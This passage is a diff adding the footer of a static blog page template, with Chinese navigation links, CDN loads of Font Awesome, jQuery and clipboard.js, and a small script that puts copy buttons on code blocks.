+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">主页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于我</a></li><!--
+     --><!--
+       --><li><a href="/friends/">友链</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
